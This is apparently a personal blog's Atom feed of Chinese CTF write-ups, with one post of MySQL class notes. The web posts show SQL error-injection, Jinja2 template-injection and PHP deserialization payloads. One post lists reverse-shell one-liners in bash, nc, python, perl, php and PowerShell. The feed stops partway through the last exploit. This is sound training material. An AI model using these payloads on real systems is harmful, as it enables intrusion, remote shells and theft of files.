<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-07T01:40:24.396Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
    <link href="http://yoursite.com/2020/05/06/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk/"/>
    <id>http://yoursite.com/2020/05/06/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk/</id>
    <published>2020-05-06T15:05:46.236Z</published>
    <updated>2020-05-07T01:40:24.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506210636892.png" srcset="/img/loading.gif" alt="image-20200506210636892"></p><p>发现敏感信息。</p><p>利用PHP伪协议读取源码</p><p><code>index.php：</code></p><pre><code class="PHP">&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file)){    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {        echo(&#39;no way!&#39;);        exit;    }    @include($file);}?&gt;</code></pre><p>这里的正则因为是/i对大小写不敏感所以我没办法绕过。</p><p>search.php</p><pre><code>&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        if(!$row) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;&lt;p&gt;å§å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;    } else {        $msg = &quot;æªæ¾å°è®¢å!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å¨&quot;;}?&gt;</code></pre><p>index.php中无法实现绕过，考虑使用二次注入。</p><p>会发现查询页面会有回显，修改页面存在报错。通过查询页面可以知道，只有地址存在’。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)<em>#</em></p></blockquote><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200506224723491.png" srcset="/img/loading.gif" alt="image-20200506224723491"></p><p>利用load_file读取flag.txt</p><blockquote><p>errorXPATH syntax error: ‘~flag{8fbc88cb-5172-4418-b655-f6’</p></blockquote><p>发现显示的不完整。</p><blockquote><p>1’ and updatexml(1,concat(0x7e,(select right(load_file(‘/flag.txt’),20)),0x7e),1)#</p></blockquote><blockquote><p>errorXPATH syntax error: ‘~-b655-f6bb7aabe0fc} ~’</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day1-Web5-CyberPunk&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day1 Web
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[MRCTF2020]PYWebsite</title>
    <link href="http://yoursite.com/2020/05/05/[MRCTF2020]PYWebsite/"/>
    <id>http://yoursite.com/2020/05/05/[MRCTF2020]PYWebsite/</id>
    <published>2020-05-05T11:17:34.924Z</published>
    <updated>2020-05-05T11:17:34.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>F12发现了</p><blockquote><p>/js/md5.js</p></blockquote><table><thead><tr><th>function enc(code){</th><th></th></tr></thead><tbody><tr><td></td><td>hash = hex_md5(code);</td></tr><tr><td></td><td>return hash;</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>function validate(){</td></tr><tr><td></td><td>var code = document.getElementById(“vcode”).value;</td></tr><tr><td></td><td>if (code != “”){</td></tr><tr><td></td><td>if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”){</td></tr><tr><td></td><td>alert(“您通过了验证！”);</td></tr><tr><td></td><td>window.location = “./flag.php”</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“你的授权码不正确！”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td>}else{</td></tr><tr><td></td><td>alert(“请输入授权码”);</td></tr><tr><td></td><td>}</td></tr><tr><td></td><td></td></tr><tr><td></td><td>}</td></tr></tbody></table><p>说输入code与某值进行比较，相等就出现flag。所以现在就是分析加密函数。</p><blockquote><p> if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”)</p></blockquote><blockquote><pre><code>function hex_md5(s){ return binl2hex(core_md5(str2binl(s), s.length * 8));}</code></pre></blockquote><p>可以看到hex_md5就是通过core_md5加密str2bin1加密后的code先去看看strbin函数</p><pre><code>function str2binl(str){  var bin = Array();  var mask = (1 &lt;&lt; 8) - 1;//mask=255  for(var i = 0; i &lt; str.length * 8; i += 8)    bin[i&gt;&gt;5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (i%32);  return bin;}</code></pre><p>额，算了好麻烦。。。换个思路直接读取flag.php(强行狡辩，其实我忘记可以直接读取的了)</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200505180527740.png" srcset="/img/loading.gif" alt="image-20200505180527740"></p><p>xff绕过。</p><p>flag{abd61860-ad51-41aa-8a19-6d7c43cbac68}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MRCTF2020-PYWebsite&quot;&gt;&lt;a href=&quot;#MRCTF2020-PYWebsite&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]PYWebsite&quot;&gt;&lt;/a&gt;[MRCTF2020]PYWebsite&lt;/h2&gt;&lt;p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[GYCTF2020]FlaskApp</title>
    <link href="http://yoursite.com/2020/05/03/[GYCTF2020]FlaskApp/"/>
    <id>http://yoursite.com/2020/05/03/[GYCTF2020]FlaskApp/</id>
    <published>2020-05-03T10:48:01.753Z</published>
    <updated>2020-05-03T10:48:01.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>在提示页面f12发现了一段神奇的cookie</p><blockquote><p>eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ</p></blockquote><p>在网站的解密页面解密一下。突然就跳转到了一个神奇的页面</p><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200503171137795.png" srcset="/img/loading.gif" alt="image-20200503171137795"></p><p>发现这是WSGI</p><p>在加密界面输入12，解密解密成功回显12</p><p>这里有个脚本</p><blockquote><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}> ```![image-20200503183556194](C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\image-20200503183556194.png)`{{''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}`最后用切片操作读取flag`{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}`</code></pre></blockquote><p>下面是一些链接：</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10251892.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/10251892.html</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GYCTF2020-FlaskApp&quot;&gt;&lt;a href=&quot;#GYCTF2020-FlaskApp&quot; class=&quot;headerlink&quot; title=&quot;[GYCTF2020]FlaskApp&quot;&gt;&lt;/a&gt;[GYCTF2020]FlaskApp&lt;/h2&gt;&lt;p&gt;在提示页
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[FBCTF2019]RCEService</title>
    <link href="http://yoursite.com/2020/05/02/[FBCTF2019]RCEService/"/>
    <id>http://yoursite.com/2020/05/02/[FBCTF2019]RCEService/</id>
    <published>2020-05-02T11:46:52.215Z</published>
    <updated>2020-05-02T11:46:52.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200502191258431.png" srcset="/img/loading.gif" alt="image-20200502191258431"></p><p>当输入{“cmd”:”ls”}有回显，但是不能读取。</p><p>本来想拼接字符串的但是没有成功。</p><p><a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">https://xz.aliyun.com/t/5399</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;FBCTF2019-RCEService&quot;&gt;&lt;a href=&quot;#FBCTF2019-RCEService&quot; class=&quot;headerlink&quot; title=&quot;[FBCTF2019]RCEService&quot;&gt;&lt;/a&gt;[FBCTF2019]RCEService&lt;/h2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[V&amp;N2020 公开赛]CHECKIN</title>
    <link href="http://yoursite.com/2020/05/02/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]CHECKIN/"/>
    <id>http://yoursite.com/2020/05/02/[V&amp;N2020%20%E5%85%AC%E5%BC%80%E8%B5%9B]CHECKIN/</id>
    <published>2020-05-02T11:12:23.753Z</published>
    <updated>2020-05-02T11:12:23.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h2><p>看到这题的时候并不会做。考点是反弹shell。</p><p>收集一点可能用上的反弹shell命令</p><p><strong><em>1\</em></strong>|<strong><em>0**</em></strong>bash**</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></pre><p><strong><em>2\</em></strong>|<strong><em>0**</em></strong>nc**</p><pre><code>nc -e /bin/sh ip port</code></pre><p><strong><em>3\</em></strong>|<strong><em>0**</em></strong>python**</p><pre><code>python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</code></pre><p><strong><em>4\</em></strong>|<strong><em>0**</em></strong>perl**</p><pre><code>perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;174.0.224.117:8080&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code></pre><p><strong><em>5\</em></strong>|<strong><em>0**</em></strong>php**</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p><strong><em>6\</em></strong>|<strong><em>0**</em></strong>PowerShell**</p><pre><code>[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&#39;$c=New-Object Net.Sockets.TCPClient(&quot;174.1.52.162&quot;,6666);$s=$c.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $d 2&gt;&amp;1 | Out-String );$sb2=$sb+&#39;&#39;PS &#39;&#39;+(pwd).Path+&#39;&#39;&gt; &#39;&#39;;$sb=([Text.Encoding]::Default).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()&#39;))powershell -nop -enc {reverse shell command}</code></pre><p>参考：<a href="https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p><p>连入后因为：</p><p>当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</p><p>执行</p><p><code>python3 -c &quot;import os;[os.system(&#39;cat /proc/&#39;+str(i)+&#39;/fd/&#39;+str(j)) for i in range(20) for j in range(10)];&quot;</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;V-amp-N2020-公开赛-CHECKIN&quot;&gt;&lt;a href=&quot;#V-amp-N2020-公开赛-CHECKIN&quot; class=&quot;headerlink&quot; title=&quot;[V&amp;amp;N2020 公开赛]CHECKIN&quot;&gt;&lt;/a&gt;[V&amp;amp;N2020 公开赛
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUCTF misc部分解题</title>
    <link href="http://yoursite.com/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/"/>
    <id>http://yoursite.com/2020/04/30/BUUCTF%20misc%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98/</id>
    <published>2020-04-30T08:51:00.377Z</published>
    <updated>2020-04-30T08:51:00.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-misc部分解题"><a href="#BUUCTF-misc部分解题" class="headerlink" title="BUUCTF misc部分解题"></a>BUUCTF misc部分解题</h1><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>是个exe文件利用file进行查看</p><blockquote><p>$ file KEY.exe<br>KEY.exe: ASCII text, with very long lines, with no line terminators</p></blockquote><p>将后缀名改为txt。</p><p>bases64解密然后改为png，发现没有用。</p><p>直接复制到url栏试试看。扫描二维码就可以了。</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200430152341644.png" srcset="/img/loading.gif" alt="image-20200430152341644"></p><p>IHDR后面的8个字节为图片的宽高修改宽高，就出现了flag。</p><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><p>根据提示，是压缩包破解的事情。直接爆破,在kali中输入。</p><blockquote><p>1、安装rarcrack</p><pre><code class="bash">apt-get install rarcrack</code></pre><p>2、指定文件进行爆破，其中type有 rar、zip、7z 三种类型</p><pre><code class="bash">rarcrack 文件名 --threads 50 --type rar</code></pre></blockquote><p>爆破出来是</p><blockquote><p>ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</p></blockquote><p>flag{70354300a5100ba78068805661b93a5c}</p><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><p>用png打开图片，winhex打开直接就发现了。</p><blockquote><p>flag{stego_is_s0_bor1ing}</p></blockquote><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><blockquote><p>flag{97314e7864a8f62627b26f3f998c37f1}</p></blockquote><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><p>题目直接写出来了，<strong>LSB隐写</strong></p><p>使用工具<strong>Stegsolve</strong>分析，这个工具是misc最常用工具，需要配置java环境，配置教程和资源在百度比较容易找到，这里不再提供。</p><p>查看<strong>各个色道</strong>，没有发现隐藏信息，</p><p>点击<strong>Analyse→Data Extract</strong></p><p>选中<strong>LSB First</strong></p><p>参数如下时发现隐藏信息,有一个明显的<strong>PNG头</strong>，<strong>save bin</strong>提取出来保存为图片</p><p><img src="https://blog.xiafeng2333.top/content/images/2019/09/15.png" srcset="/img/loading.gif" alt="15"></p><p>是一张二维码，</p><p><img src="https://blog.xiafeng2333.top/content/images/2019/09/16.png" srcset="/img/loading.gif" alt="16"></p><p>扫码得到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF-misc部分解题&quot;&gt;&lt;a href=&quot;#BUUCTF-misc部分解题&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF misc部分解题&quot;&gt;&lt;/a&gt;BUUCTF misc部分解题&lt;/h1&gt;&lt;h2 id=&quot;N种方法解决&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MySQL基础课堂笔记</title>
    <link href="http://yoursite.com/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/04/29/MySQL%E5%9F%BA%E7%A1%80%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/</id>
    <published>2020-04-29T07:30:26.468Z</published>
    <updated>2020-04-29T07:30:26.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="今日内容"><a href="#今日内容" class="headerlink" title="今日内容"></a>今日内容</h1><ol><li>数据库的基本概念</li></ol><ol start="2"><li><p>MySQL数据库软件</p><ol><li>安装</li><li>卸载</li><li>配置</li></ol></li><li><p>SQL</p></li></ol><h2 id="数据库的基本概念"><a href="#数据库的基本概念" class="headerlink" title="数据库的基本概念"></a>数据库的基本概念</h2><pre><code>1. 数据库的英文单词： DataBase 简称 ： DB2. 什么数据库？    * 用于存储和管理数据的仓库。3. 数据库的特点：    1. 持久化存储数据的。其实数据库就是一个文件系统    2. 方便存储和管理数据    3. 使用了统一的方式操作数据库 -- SQL</code></pre><p>​<br>    4. 常见的数据库软件<br>        * 参见《MySQL基础.pdf》</p><h1 id="MySQL数据库软件"><a href="#MySQL数据库软件" class="headerlink" title="MySQL数据库软件"></a>MySQL数据库软件</h1><pre><code>1. 安装    * 参见《MySQL基础.pdf》2. 卸载    1. 去mysql的安装目录找到my.ini文件        * 复制 datadir=&quot;C:/ProgramData/MySQL/MySQL Server 5.5/Data/&quot;    2. 卸载MySQL    3. 删除C:/ProgramData目录下的MySQL文件夹。3. 配置    * MySQL服务启动        1. 手动。        2. cmd--&gt; services.msc 打开服务的窗口        3. 使用管理员打开cmd            * net start mysql : 启动mysql的服务            * net stop mysql:关闭mysql服务    * MySQL登录        1. mysql -uroot -p密码        2. mysql -hip -uroot -p连接目标的密码        3. mysql --host=ip --user=root --password=连接目标的密码    * MySQL退出        1. exit        2. quit    * MySQL目录结构        1. MySQL安装目录：basedir=&quot;D:/develop/MySQL/&quot;            * 配置文件 my.ini        2. MySQL数据目录：datadir=&quot;C:/ProgramData/MySQL/MySQL Server 5.5/Data/&quot;            * 几个概念                * 数据库：文件夹                * 表：文件                * 数据：数据</code></pre><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><pre><code>1.什么是SQL？    Structured Query Language：结构化查询语言    其实就是定义了操作所有关系型数据库的规则。每一种数据库操作的方式存在不一样的地方，称为“方言”。2.SQL通用语法    1. SQL 语句可以单行或多行书写，以分号结尾。    2. 可使用空格和缩进来增强语句的可读性。    3. MySQL 数据库的 SQL 语句不区分大小写，关键字建议使用大写。    4. 3 种注释        * 单行注释: -- 注释内容 或 # 注释内容(mysql 特有)         * 多行注释: /* 注释 */3. SQL分类    1) DDL(Data Definition Language)数据定义语言        用来定义数据库对象：数据库，表，列等。关键字：create, drop,alter 等    2) DML(Data Manipulation Language)数据操作语言        用来对数据库中表的数据进行增删改。关键字：insert, delete, update 等    3) DQL(Data Query Language)数据查询语言        用来查询数据库中表的记录(数据)。关键字：select, where 等    4) DCL(Data Control Language)数据控制语言(了解)        用来定义数据库的访问权限和安全级别，及创建用户。关键字：GRANT， REVOKE 等</code></pre><h2 id="DDL-操作数据库、表"><a href="#DDL-操作数据库、表" class="headerlink" title="DDL:操作数据库、表"></a>DDL:操作数据库、表</h2><pre><code>1. 操作数据库：CRUD    1. C(Create):创建        * 创建数据库：            * create database 数据库名称;        * 创建数据库，判断不存在，再创建：            * create database if not exists 数据库名称;        * 创建数据库，并指定字符集            * create database 数据库名称 character set 字符集名;        * 练习： 创建db4数据库，判断是否存在，并制定字符集为gbk            * create database if not exists db4 character set gbk;    2. R(Retrieve)：查询        * 查询所有数据库的名称:            * show databases;        * 查询某个数据库的字符集:查询某个数据库的创建语句            * show create database 数据库名称;    3. U(Update):修改        * 修改数据库的字符集            * alter database 数据库名称 character set 字符集名称;    4. D(Delete):删除        * 删除数据库            * drop database 数据库名称;        * 判断数据库存在，存在再删除            * drop database if exists 数据库名称;    5. 使用数据库        * 查询当前正在使用的数据库名称            * select database();        * 使用数据库            * use 数据库名称;2. 操作表    1. C(Create):创建        1. 语法：            create table 表名(                列名1 数据类型1,                列名2 数据类型2,                ....                列名n 数据类型n            );            * 注意：最后一列，不需要加逗号（,）            * 数据库类型：                1. int：整数类型                    * age int,                2. double:小数类型                    * score double(5,2)                3. date:日期，只包含年月日，yyyy-MM-dd                4. datetime:日期，包含年月日时分秒     yyyy-MM-dd HH:mm:ss                5. timestamp:时间错类型    包含年月日时分秒     yyyy-MM-dd HH:mm:ss                        * 如果将来不给这个字段赋值，或赋值为null，则默认使用当前的系统时间，来自动赋值                6. varchar：字符串                    * name varchar(20):姓名最大20个字符                    * zhangsan 8个字符  张三 2个字符        * 创建表            create table student(                id int,                name varchar(32),                age int ,                score double(4,1),                birthday date,                insert_time timestamp            );        * 复制表：            * create table 表名 like 被复制的表名;              2. R(Retrieve)：查询        * 查询某个数据库中所有的表名称            * show tables;        * 查询表结构            * desc 表名;    3. U(Update):修改        1. 修改表名            alter table 表名 rename to 新的表名;        2. 修改表的字符集            alter table 表名 character set 字符集名称;        3. 添加一列            alter table 表名 add 列名 数据类型;        4. 修改列名称 类型            alter table 表名 change 列名 新列别 新数据类型;            alter table 表名 modify 列名 新数据类型;        5. 删除列            alter table 表名 drop 列名;    4. D(Delete):删除        * drop table 表名;        * drop table  if exists 表名 ;</code></pre><ul><li>客户端图形化工具：SQLYog</li></ul><h2 id="DML：增删改表中数据"><a href="#DML：增删改表中数据" class="headerlink" title="DML：增删改表中数据"></a>DML：增删改表中数据</h2><pre><code>1. 添加数据：    * 语法：        * insert into 表名(列名1,列名2,...列名n) values(值1,值2,...值n);    * 注意：        1. 列名和值要一一对应。        2. 如果表名后，不定义列名，则默认给所有列添加值            insert into 表名 values(值1,值2,...值n);        3. 除了数字类型，其他类型需要使用引号(单双都可以)引起来2. 删除数据：    * 语法：        * delete from 表名 [where 条件]    * 注意：        1. 如果不加条件，则删除表中所有记录。        2. 如果要删除所有记录            1. delete from 表名; -- 不推荐使用。有多少条记录就会执行多少次删除操作            2. TRUNCATE TABLE 表名; -- 推荐使用，效率更高 先删除表，然后再创建一张一样的表。3. 修改数据：    * 语法：        * update 表名 set 列名1 = 值1, 列名2 = 值2,... [where 条件];    * 注意：        1. 如果不加任何条件，则会将表中所有记录全部修改。</code></pre><h2 id="DQL：查询表中的记录"><a href="#DQL：查询表中的记录" class="headerlink" title="DQL：查询表中的记录"></a>DQL：查询表中的记录</h2><pre><code>* select * from 表名;1. 语法：    select        字段列表    from        表名列表    where        条件列表    group by        分组字段    having        分组之后的条件    order by        排序    limit        分页限定2. 基础查询    1. 多个字段的查询        select 字段名1，字段名2... from 表名；        * 注意：            * 如果查询所有字段，则可以使用*来替代字段列表。    2. 去除重复：        * distinct    3. 计算列        * 一般可以使用四则运算计算一些列的值。（一般只会进行数值型的计算）        * ifnull(表达式1,表达式2)：null参与的运算，计算结果都为null            * 表达式1：哪个字段需要判断是否为null            * 如果该字段为null后的替换值。    4. 起别名：        * as：as也可以省略3. 条件查询    1. where子句后跟条件    2. 运算符        * &gt; 、&lt; 、&lt;= 、&gt;= 、= 、&lt;&gt;        * BETWEEN...AND          * IN( 集合)         * LIKE：模糊查询            * 占位符：                * _:单个任意字符                * %：多个任意字符        * IS NULL          * and  或 &amp;&amp;        * or  或 ||         * not  或 !            -- 查询年龄大于20岁            SELECT * FROM student WHERE age &gt; 20;            SELECT * FROM student WHERE age &gt;= 20;            -- 查询年龄等于20岁            SELECT * FROM student WHERE age = 20;            -- 查询年龄不等于20岁            SELECT * FROM student WHERE age != 20;            SELECT * FROM student WHERE age &lt;&gt; 20;            -- 查询年龄大于等于20 小于等于30            SELECT * FROM student WHERE age &gt;= 20 &amp;&amp;  age &lt;=30;            SELECT * FROM student WHERE age &gt;= 20 AND  age &lt;=30;            SELECT * FROM student WHERE age BETWEEN 20 AND 30;            -- 查询年龄22岁，18岁，25岁的信息            SELECT * FROM student WHERE age = 22 OR age = 18 OR age = 25            SELECT * FROM student WHERE age IN (22,18,25);            -- 查询英语成绩为null            SELECT * FROM student WHERE english = NULL; -- 不对的。null值不能使用 = （!=） 判断            SELECT * FROM student WHERE english IS NULL;            -- 查询英语成绩不为null            SELECT * FROM student WHERE english  IS NOT NULL;            -- 查询姓马的有哪些？ like            SELECT * FROM student WHERE NAME LIKE &#39;马%&#39;;            -- 查询姓名第二个字是化的人            SELECT * FROM student WHERE NAME LIKE &quot;_化%&quot;;            -- 查询姓名是3个字的人            SELECT * FROM student WHERE NAME LIKE &#39;___&#39;;</code></pre><p>​<br>                – 查询姓名中包含德的人<br>                SELECT * FROM student WHERE NAME LIKE ‘%德%’;</p><p>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;今日内容&quot;&gt;&lt;a href=&quot;#今日内容&quot; class=&quot;headerlink&quot; title=&quot;今日内容&quot;&gt;&lt;/a&gt;今日内容&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;数据库的基本概念&lt;/li&gt;
&lt;/ol&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;MySQL数据库软件&lt;/p&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>[NPUCTF2020]ReadlezPHP</title>
    <link href="http://yoursite.com/2020/04/25/[NPUCTF2020]ReadlezPHP/"/>
    <id>http://yoursite.com/2020/04/25/[NPUCTF2020]ReadlezPHP/</id>
    <published>2020-04-25T11:06:15.827Z</published>
    <updated>2020-04-25T11:06:15.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>首先打开页面观看源码发现了有个隐藏的链接。</p><blockquote><p>/time.php?source</p></blockquote><p>进去后就发现了源码，很明显是PHP的反序列化漏洞。</p><pre><code class="php">&lt;?php#error_reporting(0);class HelloPhp{    public $a;    public $b;    public function __construct(){        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;        $this-&gt;b = &quot;date&quot;;    }    public function __destruct(){        $a = $this-&gt;a;        $b = $this-&gt;b;        echo $b($a);    }}$c = new HelloPhp;if(isset($_GET[&#39;source&#39;])){    highlight_file(__FILE__);    die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]);</code></pre><p>构造PHP脚本。</p><pre><code class="PHP">&lt;?phpclass HelloPhp{    public $a;    public $b;}$c = new HelloPhp();$c-&gt;b = &#39;assert&#39;;$c-&gt;a = 